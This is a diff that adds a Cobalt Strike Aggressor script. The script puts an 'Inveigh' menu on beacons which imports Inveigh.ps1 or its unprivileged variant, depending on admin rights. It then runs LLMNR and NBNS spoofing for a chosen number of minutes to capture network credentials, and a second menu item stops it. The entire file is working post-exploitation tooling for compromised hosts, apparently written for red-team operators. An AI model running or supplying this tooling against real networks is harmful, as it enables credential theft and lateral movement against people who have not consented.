@@ -1,0 +1,71 @@
+# Adds menu driven support for inveigh
+# @Und3rf10w
+
+# TODO: 
+#	* build out a proper Java Swing menu to customize the options for unprivileged and privileged inveigh
+
+
+sub runPrivilegedInveigh {
+	$bid =  $1;
+	binput($1, "powershell-import " . script_resource("inveigh/Scripts/Inveigh.ps1"));
+	bpowershell_import($1, script_resource("inveigh/Scripts/Inveigh.ps1"));
+	prompt_text("How long would you like to run Inveigh (in minutes)?", "15", {
+		binput($bid, "powershell Invoke-Inveigh -ConsoleOutput N -RunTime $1 -Tool 2 -LLMNR Y -NBNS Y -StatusOutput Y");
+		bpowershell($bid, "Invoke-Inveigh -ConsoleOutput N -RunTime $1 -Tool 2 -LLMNR Y -NBNS Y -StatusOutput Y");
+	});
+}
+
+sub runUnPrivilegedInveigh {
+	$bid = $1;
+	binput($1, "powershell-import " . script_resource("inveigh/Scripts/Inveigh-Unprivileged.ps1"));
+	bpowershell_import($1, script_resource("inveigh/Scripts/Inveigh-Unprivileged.ps1"));
+	prompt_text("How long would you like to run Inveigh (in minutes)?", "15", {
+		binput($bid, "powershell Invoke-InveighUnprivileged -ConsoleOutput N -RunTime $1 -Tool 2 -LLMNR Y -NBNS Y -StatusOutput Y");
+		bpowershell($bid, "Invoke-InveighUnprivileged -ConsoleOutput N -RunTime $1 -Tool 2 -LLMNR Y -NBNS Y -StatusOutput Y");
+	});
+}
+
+sub stopInveigh{
+	$bid = $1;
+	binput($1, "powershell-import " . script_resource("inveigh/Scripts/Inveigh.ps1"));
+	bpowershell_import($1, script_resource("inveigh/Scripts/Inveigh.ps1"));
+	bpowershell($bid, "Stop-Inveigh");
+}
+
+sub stopInveigh-Unprivileged{
+	$bid = $1;
+	binput($1, "powershell-import " . script_resource("inveigh/Scripts/Inveigh-Unprivileged.ps1"));
+	bpowershell_import($1, script_resource("inveigh/Scripts/Inveigh-Unprivileged.ps1"));
+	bpowershell($bid, "Stop-Inveigh");
+}
+
+popup beacon_bottom {
+	menu "Inveigh"{
+		item "Run Inveigh"{
+			local('$bid');
+			foreach $bid ($1){
+				if (-isadmin $bid){
+					blog($1, "\c3Beacon is admin\c0, \c8running privileged Inveigh\c0");
+					runPrivilegedInveigh($bid);
+				}
+				else {
+					blog($1, "\c4Beacon is not admin\c0, \c8running unprivileged Inveigh\c0");
+					runUnPrivilegedInveigh($bid);
+				}
+			}
+		}
+		item "Stop Running Inveigh"{
+			local('$bid');
+			foreach $bid ($1){
+				if (-isadmin $bid){
+					blog($1, "Attempting to stop Inveigh");
+					stopInveigh($bid);
+				}
+				else {
+					blog($1, "Attempting to stop unprivileged Inveigh");
+					stopInveigh-Unprivileged($bid);
+				}
+			}
+		}
+	}
+}
